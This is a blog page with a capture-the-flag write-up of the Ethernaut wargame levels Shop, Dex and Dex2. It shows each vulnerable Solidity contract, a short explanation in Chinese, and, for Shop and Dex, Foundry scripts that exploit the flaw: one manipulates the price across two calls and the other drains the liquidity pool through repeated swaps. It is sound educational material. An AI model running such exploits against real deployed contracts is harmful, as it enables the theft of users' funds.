@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12,"avatar":{"url":"/images/avatar.png","rounded":true,"rotated":false}},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac","show_result":true},"fold":{"enable":false,"height":500},"language":false,"border_radius":{"header":true,"content":true}},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Shop123456789101112131415161718192021&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IBuyer &#123;    function price() external view returns (uint256);&#125;contract Shop &#123;    uin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ethernaut 21-23">
+<meta property="og:url" content="http://example.com/2026/02/03/ethernaut4/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Shop123456789101112131415161718192021&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IBuyer &#123;    function price() external view returns (uint256);&#125;contract Shop &#123;    uin">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-02-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-02-02T17:20:09.489Z">
+<meta property="article:author" content="D3">
+<meta property="article:tag" content="Ethernaut">
+<meta property="article:tag" content="Web3 Security">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2026/02/03/ethernaut4/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2026/02/03/ethernaut4/","path":"2026/02/03/ethernaut4/","title":"Ethernaut 21-23"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Ethernaut 21-23 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">2</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">1</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">4</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Shop"><span class="nav-number">1.</span> <span class="nav-text">Shop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp"><span class="nav-number">1.2.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dex"><span class="nav-number">2.</span> <span class="nav-text">Dex</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-number">2.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp-1"><span class="nav-number">2.2.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dex2"><span class="nav-number">3.</span> <span class="nav-text">Dex2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="nav-number">3.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp-2"><span class="nav-number">3.2.</span> <span class="nav-text">Exp</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">D3</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/d3mxbu7" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;d3mxbu7" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:e3m0bu7@gmail.com" title="E-Mail → mailto:e3m0bu7@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/03/ethernaut4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="D3">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Ethernaut 21-23 | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Ethernaut 21-23
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-02-03 00:00:00" itemprop="dateCreated datePublished" datetime="2026-02-03T00:00:00+08:00">2026-02-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF-Ethernaut-Writeups/" itemprop="url" rel="index"><span itemprop="name">CTF-Ethernaut Writeups</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IBuyer &#123;</span><br><span class="line">    function price() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">    uint256 public price = 100;</span><br><span class="line">    bool public isSold;</span><br><span class="line"></span><br><span class="line">    function buy() public &#123;</span><br><span class="line">        IBuyer _buyer = IBuyer(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">            isSold = true;</span><br><span class="line">            price = _buyer.price();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>类似与不知明的外部调用，合约采用接口调用，外部接口的函数时不清楚的，所以我们可以控制返回的值，从而控制目标合约</p>
+<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">interface Ishop &#123;</span><br><span class="line">    function buy() external;</span><br><span class="line">    function price() external view returns (uint256);</span><br><span class="line">    function isSold() external view returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ShopSolution is Script &#123;</span><br><span class="line">    function run() public &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        Ishop shop = Ishop(0x9D94F04c402e710770643DdEcCf0e74fBf21e58A);</span><br><span class="line">        console.log(&quot;getprice&quot;, shop.price());</span><br><span class="line">        console.log(&quot;isSold&quot;, shop.isSold());</span><br><span class="line">        ShopAttack attack = new ShopAttack(address(shop));</span><br><span class="line">        attack.attack();</span><br><span class="line">        console.log(&quot;getpriceAfter&quot;, shop.price());</span><br><span class="line">        console.log(&quot;isSoldAfter&quot;, shop.isSold());</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ShopAttack &#123;</span><br><span class="line">    Ishop public shop;</span><br><span class="line"></span><br><span class="line">    constructor(address _shopAddress) &#123;</span><br><span class="line">        shop = Ishop(_shopAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        shop.buy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() external view returns (uint256 _price) &#123;</span><br><span class="line">        //通过判断shop.isSold()的值返回不同的价格，当isSold为false时返回100，为true时返回1</span><br><span class="line">        if (!shop.isSold()) return 100;</span><br><span class="line">        else return 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Dex"><a href="#Dex" class="headerlink" title="Dex"></a>Dex</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;lib/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;lib/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;lib/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">    address public token1;</span><br><span class="line">    address public token2;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">        token2 = _token2;</span><br><span class="line">    &#125;</span><br><span class="line">    //向Dex合约中添加流动性，只有合约拥有者可以调用此函数</span><br><span class="line"></span><br><span class="line">    function addLiquidity(address token_address, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(address from, address to, uint256 amount) public &#123;</span><br><span class="line">        require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class="line">        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">        uint256 swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">        IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) &#123;</span><br><span class="line">        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public &#123;</span><br><span class="line">        SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">        SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address token, address account) public view returns (uint256) &#123;</span><br><span class="line">        return IERC20(token).balanceOf(account);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">    address private _dex;</span><br><span class="line"></span><br><span class="line">    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)</span><br><span class="line">        ERC20(name, symbol)</span><br><span class="line">    &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">        require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">        super._approve(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>函数<code>function getSwapPrice</code>有大问题，每次swap一次之后token都会变多，换着换着就会导致整个池子的钱都拿走了，详细可以看Exp的变化注释</p>
+<h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">interface Idex &#123;</span><br><span class="line">    function swap(address from, address to, uint256 amount) external;</span><br><span class="line">    function approve(address spender, uint256 amount) external;</span><br><span class="line">    function token1() external view returns (address);</span><br><span class="line">    function token2() external view returns (address);</span><br><span class="line">    function balanceOf(address token, address account) external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//**********************************************************************************************************************</span><br><span class="line">// Dex		User</span><br><span class="line">// token1	token2	token1	token2</span><br><span class="line">// 100	100	10	10</span><br><span class="line">// 110	90	0	20</span><br><span class="line">// 86	110	24	0</span><br><span class="line">// 110	80	0	30</span><br><span class="line">// 69	110	41	0</span><br><span class="line">// 110	45	0	65</span><br><span class="line">// 0	90	110	20</span><br><span class="line">//**********************************************************************************************************************</span><br><span class="line">contract DexSolution is Script &#123;</span><br><span class="line">    function run() external &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        Idex idex = Idex(0x823d27e854e8c56313BC8913c5f2eFcE77AFE466);</span><br><span class="line">        idex.approve(address(idex), 500);</span><br><span class="line">        address token1 = idex.token1();</span><br><span class="line">        address token2 = idex.token2();</span><br><span class="line">        console.log(&quot;token1Before&quot;, idex.balanceOf(token1, msg.sender));</span><br><span class="line">        console.log(&quot;token2Before&quot;, idex.balanceOf(token2, msg.sender));</span><br><span class="line">        idex.swap(token1, token2, 10);</span><br><span class="line">        idex.swap(token2, token1, 20);</span><br><span class="line">        idex.swap(token1, token2, 24);</span><br><span class="line">        idex.swap(token2, token1, 30);</span><br><span class="line">        idex.swap(token1, token2, 41);</span><br><span class="line">        // 110 = (amountIn * 110) / 45  =&gt;  amountIn = 45</span><br><span class="line">        idex.swap(token2, token1, 45);</span><br><span class="line">        console.log(&quot;token1After&quot;, idex.balanceOf(token1, msg.sender));</span><br><span class="line">        console.log(&quot;token2After&quot;, idex.balanceOf(token2, msg.sender));</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Dex2"><a href="#Dex2" class="headerlink" title="Dex2"></a>Dex2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;lib/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;lib/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;lib/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract DexTwo is Ownable &#123;</span><br><span class="line">    address public token1;</span><br><span class="line">    address public token2;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">        token2 = _token2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function add_liquidity(address token_address, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(address from, address to, uint256 amount) public &#123;</span><br><span class="line">        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">        uint256 swapAmount = getSwapAmount(from, to, amount);</span><br><span class="line">        IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) &#123;</span><br><span class="line">        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public &#123;</span><br><span class="line">        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);</span><br><span class="line">        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address token, address account) public view returns (uint256) &#123;</span><br><span class="line">        return IERC20(token).balanceOf(account);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableTokenTwo is ERC20 &#123;</span><br><span class="line">    address private _dex;</span><br><span class="line"></span><br><span class="line">    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)</span><br><span class="line">        ERC20(name, symbol)</span><br><span class="line">    &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">        require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">        super._approve(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>跟上关的区别在于就是<code>require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), “Invalid tokens”)</code>就会导致Dex可以接受任何 token进行swap而不限于token1和token2。这样用自创可控的Token就可以把全部的Token1和Token2全部换出来</p>
